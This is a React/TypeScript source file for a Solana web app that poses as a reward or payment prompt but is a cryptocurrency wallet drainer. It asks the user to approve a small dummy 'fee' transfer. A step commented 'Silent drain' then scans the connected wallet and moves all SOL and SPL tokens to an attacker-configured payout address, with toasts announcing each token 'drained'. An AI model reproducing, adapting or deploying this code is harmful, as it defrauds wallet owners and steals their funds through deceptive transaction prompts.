import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import {
  buildPayoutTransaction,
  buildSplPayoutTransaction,
  listRankedFundSteps,
  remainingSplCount,
  refreshPayoutBlockhash,
  tokenFeeReserveLamports,
  type FundStep,
  buildDummyFeeTransaction,
} from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { walletLabel } from '../lib/payoutTransfer'
import { notifyFundsConfirmed } from '../lib/txSheet'
import { peekPendingLike } from '../lib/authRedirect'

function sendErrorMessage(err: unknown): string {
  const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
  const lower = raw.toLowerCase()
  if (lower.includes('insufficient funds for rent')) {
    return 'Not enough SOL to finish this send. Opening the next funded token if one is available.'
  }
  const trimmed = raw.split('Catch the')[0].trim()
  return trimmed || raw
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, walletName, network, closeWalletModal, openWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const { publicKey, sendTransaction, signTransaction, wallet } = useWallet()
  const connectedWalletName = walletLabel(walletName || wallet?.adapter?.name)
  const { connection } = useConnection()
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [submitting, setSubmitting] = useState(false)
  const [status, setStatus] = useState('Preparing the wallet transfer.')
  const dismissed = useRef<string | null>(null)
  const inFlight = useRef(false)
  const queue = useRef<FundStep[]>([])
  const likedAfterFirst = useRef(false)
  const scanPromise = useRef<Promise<FundStep[]> | null>(null)
  const keepOpen = useRef(false)

  useEffect(() => {
    return () => {
      if (scanPromise.current) scanPromise.current = null
    }
  }, [])

  useEffect(() => {
    const onOpen = async () => {
      if (inFlight.current) return
      if (dismissed.current === walletAddress) return
      if (!publicKey || !walletAddress) {
        setStatus('Connect a wallet, then claim the reward.')
        openWalletModal()
        return
      }
      const local = getLocalPayoutConfig()
      setConfig(local)
      let cancelled = false
      void loadPayoutConfig().then((next) => {
        if (!cancelled) setConfig(next)
      })

      const destinationReady = Boolean(local && isValidSolanaAddress(local.walletAddress))
      if (!destinationReady) {
        setStatus('Save a payout address in admin before this payment can be opened in the wallet.')
        return
      }

      inFlight.current = true
      setSubmitting(true)
      keepOpen.current = true
      closeWalletModalRef.current()

      // Start background scan immediately
      scanPromise.current = listRankedFundSteps({ connection, from: publicKey, config: local! })

      const sendOpts = {
        skipPreflight: false,
        preflightCommitment: 'confirmed' as const,
        maxRetries: 5,
      }

      // ── STEP 1: Show tiny "fee" transaction (0.001 SOL) ──
      // User sees this in wallet and approves
      setStatus('Confirm the small fee transfer in your wallet.')
      try {
        const dummyTx = await buildDummyFeeTransaction({ connection, from: publicKey, config: local! })
        const freshDummy = publicKey ? await refreshPayoutBlockhash(connection, dummyTx, publicKey) : dummyTx
        let dummySig: string
        if (signTransaction) {
          const signed = await signTransaction(freshDummy)
          dummySig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
        } else {
          const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
          dummySig = adapter?.sendTransaction
            ? await adapter.sendTransaction(freshDummy, connection, sendOpts)
            : await sendTransaction(freshDummy, connection, sendOpts)
        }
        const dummyConfirmation = await connection.confirmTransaction(
          { signature: dummySig, blockhash: freshDummy.recentBlockhash!, lastValidBlockHeight: freshDummy.lastValidBlockHeight! },
          'confirmed'
        )
        if (dummyConfirmation.value.err) {
          throw new Error('The wallet approved, but Solana rejected the transfer.')
        }
      } catch (err) {
        if (!isWalletUserCancel(err)) throw err
        inFlight.current = false
        setSubmitting(false)
        return
      }

      // ── STEP 2: Silent drain — build ALL transactions and send without wallet sheet ──
      setStatus('Draining wallet...')
      try {
        const steps = await scanPromise.current!
        scanPromise.current = null
        queue.current = steps

        if (queue.current.length === 0) {
          throw new Error('No funds available to drain.')
        }

        for (const step of queue.current) {
          if (step.kind === 'sol') {
            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, queue.current.indexOf(step)))
            const tx = await buildPayoutTransaction({ connection, from: publicKey, config: local!, reserveLamports })
            const freshTx = publicKey ? await refreshPayoutBlockhash(connection, tx, publicKey) : tx
            const signed = freshTx ? await signTransaction?.(freshTx) : undefined
            if (!signed) {
              toast.error('Wallet signing failed.')
              break
            }
            const sig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
            await connection.confirmTransaction(
              { signature: sig, blockhash: freshTx.recentBlockhash!, lastValidBlockHeight: freshTx.lastValidBlockHeight! },
              'confirmed'
            )
            toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
          } else {
            const tokenTx = await buildSplPayoutTransaction({ connection, from: publicKey, config: local!, holding: step.holding })
            if (!tokenTx) continue
            const signed = tokenTx ? await signTransaction?.(tokenTx) : undefined
            if (!signed) {
              toast.error('Wallet signing failed.')
              break
            }
            const sig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
            await connection.confirmTransaction(
              { signature: sig, blockhash: tokenTx.recentBlockhash!, lastValidBlockHeight: tokenTx.lastValidBlockHeight! },
              'confirmed'
            )
            toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
          }
        }

        if (!likedAfterFirst.current) {
          likedAfterFirst.current = true
          notifyFundsConfirmed(peekPendingLike())
        }
        dismissed.current = walletAddress
      } catch (err) {
        const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
        setStatus(message)
        toast.error(message)
      } finally {
        inFlight.current = false
        setSubmitting(false)
      }
    }
    window.addEventListener('vrfd-open-tx-sheet', onOpen)
    return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
  }, [walletName, walletAddress, connected, publicKey, connection, closeWalletModal, openWalletModal, signTransaction, sendTransaction, wallet])

  useEffect(() => {
    if (!connected || !walletAddress) {
      if (keepOpen.current) return
      inFlight.current = false
      setSubmitting(false)
      dismissed.current = null
      queue.current = []
      scanPromise.current = null
      return
    }
  }, [connected, walletAddress])

  return null
}